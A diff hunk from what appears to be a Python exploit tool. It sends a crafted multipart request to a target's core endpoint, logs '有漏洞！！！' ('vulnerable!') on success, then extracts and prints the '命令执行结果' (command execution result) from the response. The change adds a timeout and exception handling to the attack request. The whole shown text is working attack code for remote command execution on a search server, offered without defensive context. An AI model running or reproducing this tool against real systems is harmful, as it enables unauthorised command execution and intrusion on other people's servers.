@@ -53,22 +53,26 @@ def exp(target, core_name, cmd, logs_file):
     headers = {
         'User-Agent': usera()
     }
-    r = requests.post(URL, files=files, headers=headers, verify=False)
-    final_result = r.text
-    if r.status_code == 200:
-        print("有漏洞！！！", file=logs_file)
-        result = re.search(
-            r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', final_result, re.I)
-        if result:
-            final_result = result.group(1)
+    try:
+        r = requests.post(URL, files=files, headers=headers,
+                          verify=False, timeout=8)
+        final_result = r.text
+        if r.status_code == 200:
+            print("有漏洞！！！", file=logs_file)
+            result = re.search(
+                r'documents"><lst><arr name="title"><str>([\s\S]*?)</str></arr></lst>', final_result, re.I)
+            if result:
+                final_result = result.group(1)
+            else:
+                print("正则没匹配到，直接输出原文", file=logs_file)
+            print("命令执行结果：", file=logs_file)
+            print(final_result, file=logs_file)
+            return True
         else:
-            print("正则没匹配到，直接输出原文", file=logs_file)
-        print("命令执行结果：", file=logs_file)
-        print(final_result, file=logs_file)
-        return True
-    else:
-        print("没有洞，GG")
-        return False
+            print("没有洞，GG")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(e, file=logs_file)
 
 
 def get_core_name(target):
